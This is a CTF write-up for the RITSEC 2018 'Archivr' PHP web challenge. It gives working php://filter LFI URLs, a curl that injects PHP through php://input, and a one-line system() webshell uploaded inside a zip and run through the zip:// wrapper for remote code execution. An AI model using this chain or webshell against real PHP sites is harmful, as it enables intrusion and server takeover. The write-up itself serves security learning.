@@ -1,0 +1,194 @@
+# Writeup for the `Archivr` chall from RITSEC CTF 2018
+
+
+**Keywords**: PHP, LFI, RCE
+
+**Category**: Web
+
+**Points**: 300
+
+> fun.ritsec.club:8004
+
+> Author: jwood
+
+## Understanding the application
+
+`fun.ritsec.club:8004` is a website where you can upload a file then retrieve it.
+
+The `http://fun.ritsec.club:8004/index.php?page=upload` is the page to upload a file, `http://fun.ritsec.club:8004/index.php?page=download` to download a previously uploaded file.
+
+When you upload a file, you are given a `key` which looks like this: `$TIMESTAMP.file_extension`
+
+This key is needed to retrieve the file on the download page.
+
+The first this which comes to my mind is "Can I upload a PHP file?". I tried to upload a `root.php` file and the extension gets renamed to `$TIMESTAMP.dat`, weird...
+
+## LFI, aka getting the sources
+
+As you've seen there is a `page` page parameter in the previous upload and download URLs. One current PHP vulnerability is to include a page based on user input, something like this:
+
+```php
+<?php include($_GET['page'] . '.php'); ?>
+```
+
+Why is this dangerous? Firstly because you use untrusted user input in your code, secondly because it can be used to read files and sometimes even getting a remote command execution over your server (RCE).
+
+In this case, we can retrieve the php of the server using these URLs:
+
+`http://fun.ritsec.club:8004/index.php?page=php://filter/convert.base64-encode/resource=index`
+
+`http://fun.ritsec.club:8004/index.php?page=php://filter/convert.base64-encode/resource=upload`
+
+`http://fun.ritsec.club:8004/index.php?page=php://filter/convert.base64-encode/resource=download`
+
+To understand why it works, you can read this beautiful article: [https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)
+
+Here are the files retrieved from the server:
+
+```php
+# index.php, file containing the LFI vulnerability
+<?php
+include("classes.php.inc");
+include((isset($_GET['page']) && is_string($_GET['page']) ? $_GET['page'] : "home") . ".php");
+?>
+```
+
+```php
+# upload.php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if ($_FILES['upload']['size'] > 5000) { //max 5KB
+        die("File too large!");
+    }
+    $filename = $_FILES['upload']['name'];
+
+    $upload_time = time();
+    $upload_dir = "uploads/" . md5($_SERVER['REMOTE_ADDR']) . "/";
+
+    $ext = "";
+    if (strpos($filename, '.') !== false) {
+        $f_ext = explode(".", $filename)[1];
+        if (ctype_alnum($f_ext) && stripos($f_ext, "php") === false) {
+            $ext = "." . $f_ext;
+        } else {
+            $ext = ".dat";
+        }
+    } else {
+        $ext = ".dat";
+    }
+
+    $upload_path = $upload_dir . md5($upload_time) . $ext;
+    mkdir($upload_dir, 0770, true);
+
+    // some useless code...
+
+    move_uploaded_file($_FILES['upload']['tmp_name'], $upload_path);
+    $key = $upload_time . $ext;
+}
+// More HTML stuff..
+?>
+```
+
+```php
+# download.php
+<?php
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    $key = $_POST['key'];
+
+    if (strpos($key, '.') !== false) {
+        $key_parts = explode(".", $key);
+        $hashed_key = md5(intval($key_parts[0])) . "." . $key_parts[1];
+
+        $path = "uploads/" . md5($_SERVER['REMOTE_ADDR']) . "/" . $hashed_key;
+        if (file_exists($path)) {
+            header("Content-Disposition: attachment; filename=\"" . $key . "\"");
+            die(file_get_contents($path));
+        } else {
+            $error = "File not found!";
+        }
+    } else {
+        $error = "Invalid key!";
+    }
+}
+// HTML stuff
+?>
+
+```
+
+Like you can see in the `index.php` file, we can only include files which ends with a `.php`, this is a big restriction that we will need to take care of later on.
+
+## Understanding the code
+
+First think to do in these kind of challenges is to understand how the code works and what are the things you can expect to go wrong.
+
+The first thing you can expect to go wrong is the fact that we have a file upload functionnality so maybe we can execute code.
+
+One way to do so is to upload a php code in a txt file and then a `.htaccess` file containing something like this:
+
+```
+AddType application/x-httpd-php .txt
+```
+
+So we want to know if:
+- we can upload a .htaccess
+- we can access the uploaded files directly from the URL
+
+In `upload.php` we can see that our file is uploaded under this path: `"uploads/" . md5($clientIP) . "/" . md5($timestamp) . "$extension"`
+
+The `$extension` being alphanumerical. As you can see there is NO way we can upload a `.htaccess` file. [https://media.giphy.com/media/9Y5BbDSkSTiY8/giphy.gif](https://media.giphy.com/media/9Y5BbDSkSTiY8/giphy.gif)
+
+Anyway, let's try to access a file we uploaded, maybe it can cheer me up! :D
+
+I tried to upload a really simple file and create the path for it using my IP, the timestamp of my upload and so on.. I ended up with an URL like this: `http://fun.ritsec.club:8004/uploads/MD5($MY_IP)/MD5($time).txt` Aaaaand 404 :'( 
+
+I re-tried again and again and I couldn't find the files uploaded.. So I decided to test it locally. I fired up a local php server using:
+
+```bash
+php -S localhost:8000
+```
+
+Which serves php in the current directory.
+
+I tried to upload a file and access it and I failed (404 again..), so I added some debug and apparently `$_SERVER[REMOTE_ADDR]` was set to `::1` and not `127.0.0.1`. I've changed my md5 to match my actual client IP and it worked, I can now access my file directly :)
+
+So the challenge must be using some kind of setup that makes the `$_SERVER[REMOTE_ADDR]` different from my actual public IP, which is not so great.. So I used another vulnerability in another web challenge to print out the actual `REMOTE_ADDR`:
+
+```bash
+$ curl "http://fun.ritsec.club:8007/devsrule.php?magic=php://input" -d '<?php print $_SERVER["REMOTE_ADDR"]; ?>'
+[.. cut ..]10.0.10.254
+```
+
+OK! So there IS a special setup which hides the actual client IP from the php scripts! Trying to access my uploaded file again using this url: `http://fun.ritsec.club:8004/uploads/           MD5(10.0.10.254)/MD5($time).txt` and it now works \o/
+
+## Summary
+
+Let's list out everything we know so far from the challenge:
+
+- We can upload files and access them directly through the website, but we can't upload files with a `php` extension
+- We have an LFI which allow us to include files with a `php` extension
+
+## Final exploit
+
+We need to include a file that we previously uploaded using the LFI vulnerability in the `index.php` file, it would allow us to get RCE and surely solve the challenge!
+
+The issue is that we can't include files which doesn't end with `.php`. BUT we can make use of a php filter (like the base64 one, used to retrieve the content of the PHP files).
+
+After some digging on the PHP docs I've found this interesting filter: [http://php.net/manual/fr/wrappers.compression.php](http://php.net/manual/fr/wrappers.compression.php), more precisely this one: `zip://archive.zip#dir/file.txt` which gives you the ability to include a file contained in a zip.
+
+I believe you know where this is going ;)
+
+```bash
+$ echo '<?php system($_GET["cmd"] . "2>&1")' > backdoor.php
+$ zip backdoor.zip backdoor.php
+```
+
+Then let's upload this ZIP file, and make sure that we can access it: `http://fun.ritsec.club:8004/uploads/MD5(10.0.10.254)/MD5($time).zip`
+
+Once it's done, you just have to access this page:
+
+`http://fun.ritsec.club:8004/?page=zip://upload/MD5(10.0.10.254)/MD5($time).zip%23backdoor&cmd=ls -la`
+
+To explain a bit more, the index.php page includes the file `"upload/MD5(10.0.10.254)/MD5($time).zip#backdoor" + ".php"`. It's a PHP filter, which means that PHP will unzip the ZIP, and include the file `backdoor.php` in it and execute the php code in it. In the PHP code there is our little webshell which allows us to get the flag \o/
+
+## Thanks!
+
+This was a really great challenge, I was on of the first people to flag it (the 4th I believe), BUT it was really hard to guess that the `REMOTE_ADDR` was not your IP.. Hopefully for me I had solved another challenge which allowed me to retrieve the actual IP address ;)
